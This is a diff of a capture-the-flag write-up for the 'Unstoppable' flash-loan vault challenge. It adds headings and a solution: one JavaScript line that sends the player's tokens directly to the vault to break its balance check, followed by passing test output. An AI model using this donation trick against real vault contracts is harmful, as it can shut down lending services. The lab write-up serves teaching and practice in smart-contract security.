@@ -4,8 +4,9 @@
 
 Given contracts.
 
+**UnstoppableVault.sol**
+
 ```solidity
-// UnstoppableVault.sol
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -126,8 +127,9 @@ contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC462
 }
 ```
 
+**ReceiverUnstoppable.sol**
+
 ```solidity
-// ReceiverUnstoppable.sol
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -182,3 +184,20 @@ To pass the challenge, make the vault stop offering flash loans.
 You start with 10 DVT tokens in balance.
 
 # Subverting
+
+
+```js
+await token.transfer(vault.address, token.balanceOf(player.address));
+```
+
+```powershell
+  [Challenge] Unstoppable
+    ✔ Execution
+
+
+  1 passing (2s)
+
+Done in 2.69s.
+```
+
+**_by wasny0ps_**
